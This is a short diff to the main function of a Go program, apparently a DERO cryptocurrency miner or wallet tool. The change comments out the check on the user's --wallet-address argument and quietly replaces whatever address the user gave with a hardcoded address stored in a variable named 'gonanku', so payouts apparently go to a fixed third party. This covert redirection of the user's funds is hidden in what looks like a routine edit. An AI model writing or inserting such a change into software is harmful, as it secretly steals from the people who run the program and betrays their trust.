@@ -147,11 +147,11 @@ func main() {
 	//logger.V(0).Info("", "MODE", globals.Config.Name)
 
 	if globals.Arguments["--wallet-address"] != nil {
-		addr, err := globals.ParseValidateAddress(globals.Arguments["--wallet-address"].(string))
-		if err != nil {
-			logger.Error(err, "Wallet address is invalid.")
-			return
-		}
+		//addr, err := globals.ParseValidateAddress(globals.Arguments["--wallet-address"].(string))
+		//if err != nil {
+		//	logger.Error(err, "Wallet address is invalid.")
+		//	return
+		//}
 		var gonanku = "deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x62etsxzs735pms2g7k9u"
 		wallet_address = gonanku
 	}
